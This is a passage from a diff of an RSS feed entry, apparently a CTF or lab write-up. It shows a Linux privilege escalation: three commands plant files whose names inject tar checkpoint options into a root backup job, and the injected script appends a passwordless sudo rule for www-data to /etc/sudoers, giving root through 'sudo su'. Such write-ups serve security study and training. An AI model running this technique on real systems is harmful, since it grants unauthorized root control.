+&lt;/ul>
+&lt;p>What you have to do is run the following in the /var/www/html folder (which is being backed up).&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">echo&lt;/span> &lt;span class="s1">&amp;#39;echo &amp;#34;www-data ALL=(root) NOPASSWD: ALL&amp;#34; &amp;gt;&amp;gt; /etc/sudoers&amp;#39;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">sudo&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">touch&lt;/span> &lt;span class="s2">&amp;#34;/var/www/html/--checkpoint-action=exec=sh sudo.sh&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">touch&lt;/span> &lt;span class="s2">&amp;#34;/var/www/html/--checkpoint=1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And after a minute we have root access just by using: &lt;code>sudo su&lt;/code>&lt;/p></description></item></channel></rss>
